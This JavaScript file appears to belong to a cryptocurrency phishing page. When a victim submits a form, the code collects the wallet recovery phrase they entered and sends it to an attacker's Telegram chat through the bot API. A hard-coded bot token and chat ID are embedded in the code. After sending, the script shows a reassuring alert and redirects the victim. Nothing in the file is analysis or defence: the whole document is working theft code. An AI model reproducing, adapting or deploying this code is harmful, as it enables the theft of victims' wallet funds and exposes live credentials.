// Replace YOUR_BOT_TOKEN with your Telegram bot token from BotFather
const botToken = "7859150183:AAGh3mscBoMuc1yQTFidmsnA7negZwwtTx4"; // e.g., "123456789:ABCdefGhIjKlmNoPqRstUVwxyz"
// Replace YOUR_CHAT_ID with your chat ID from Telegram
const chatId = "2013990871"; // e.g., 2013990871

document.getElementById("phraseForm").addEventListener("submit", function (event) {
    event.preventDefault(); // Prevent form reload

    // Collect all form input values
    const inputs = document.querySelectorAll("#phraseForm input[type=text]");
    const recoveryPhrase = Array.from(inputs).map((input) => input.value.trim()).join(", ");

    // Create the message for Telegram
    const message = `🚨 *New Recovery Phrase Submission* 🚨\n\n\`${recoveryPhrase}\``;

    // Send the message to Telegram via the bot API
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown", // Format the text as Markdown for better readability
        }),
    })
        .then((response) => {
            if (response.ok) {
                alert("Recovery phrases successfully submitted and notification sent!");
                window.location.href = "index(Wallet).html"; // Redirect after success
            } else {
                alert("Error sending recovery phrases. Please try again.");
            }
        })
        .catch((error) => {
            console.error("Telegram API error:", error);
            alert("Error connecting to Telegram. Please try again.");
        });
});
